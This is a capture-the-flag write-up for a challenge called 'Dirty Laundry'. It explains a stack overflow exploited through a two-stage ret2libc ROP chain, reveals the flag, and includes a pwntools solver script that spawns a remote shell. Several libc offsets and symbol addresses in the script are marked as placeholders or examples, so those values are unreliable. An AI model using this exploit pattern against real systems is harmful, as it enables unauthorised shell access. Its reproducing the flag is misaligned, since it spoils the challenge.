# Dirty Laundry

## Description
The washing machine doesn't seem to work. Could you take a look?
Binary with libc 2.35 provided. Connect via `ncat --ssl dirty-laundry.ctf.prgy.in 1337`.

## Solution
Classic ret2libc buffer overflow. The `vuln()` function allocates a 0x40 (64) byte buffer but reads 0x100 (256) bytes via `read()`, giving a clean stack overflow with no canary and no PIE.

**Binary protections:** Partial RELRO, No canary, NX enabled, No PIE.

**Strategy: Two-stage ROP chain**
1.  **Stage 1 — Leak libc:** Overflow to call `puts(GOT.puts)` which prints the resolved libc address of puts, then return to `vuln` for a second input. A `ret` gadget is inserted before the return to `vuln` to fix 16-byte stack alignment.
2.  **Stage 2 — Shell:** Calculate libc base from the leak, overflow again to call `system("/bin/sh")`.

 Key gadgets from the binary (no PIE, so addresses are fixed):
- `pop rdi; pop r14; ret` at 0x4011a7
- `ret` at 0x40101a

## Flag
`p_ctf{14UnDryHASbEenSUCces$fU11YCOMP1e73d}`

## Solver Script

```python
from pwn import *

# context.log_level = 'debug'

def solve():
    binary = './dirty_laundry' # Placeholder name
    # e = ELF(binary)
    # libc = ELF('./libc.so.6')
    r = remote('dirty-laundry.ctf.prgy.in', 1337)
    
    # 1. Leak Libc
    # ROP: pop rdi; ret -> got.puts -> plt.puts -> vuln
    
    # Offsets (Need to be determined by cyclic analysis or static analysis)
    # Writeup says buf 0x40, read 0x100. Ret addr at offset 0x48 (72)?
    # Assuming RBP is saved, then: buffer(64) + rbp(8) + ret(8)
    offset = 72 
    
    # Gadgets (from writeup)
    pop_rdi = 0x4011a7 # pop rdi; pop r14; ret
    ret = 0x40101a
    
    # Symbols (Platform dependent, placeholders based on std 64-bit ELF)
    # In a real script these would come from the provided binary/ELF class
    # Assumed for structure:
    got_puts = 0x404018 
    plt_puts = 0x401060
    vuln_addr = 0x401150 # Address of vuln function start
    
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(got_puts)
    payload += p64(0) # pop r14 junk
    payload += p64(plt_puts)
    payload += p64(vuln_addr) # Return to vuln for stage 2
    
    r.sendline(payload)
    
    # Receive leak
    # Might need to consume prompts
    try:
        r.recvuntil(b'\n') # consume echo if any
        leak = r.recvline().strip()
        leak = u64(leak.ljust(8, b'\x00'))
        log.info(f"Leaked puts: {hex(leak)}")
        
        # Calculate base (Using standard libc offsets or the provided one)
        # libc_puts_offset = libc.symbols['puts']
        libc_puts_offset = 0x80ed0 # Example ubuntu 22.04 offset
        libc_base = leak - libc_puts_offset
        log.info(f"Libc base: {hex(libc_base)}")
        
        # Stage 2: System("/bin/sh")
        system_addr = libc_base + 0x50d60 # Example offset
        bin_sh_addr = libc_base + 0x1d8698 # Example offset
        
        payload2 = b'A' * offset
        payload2 += p64(ret) # Stack alignment
        payload2 += p64(pop_rdi)
        payload2 += p64(bin_sh_addr)
        payload2 += p64(0) # r14 junk
        payload2 += p64(system_addr)
        
        r.sendline(payload2)
        r.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    solve()
```

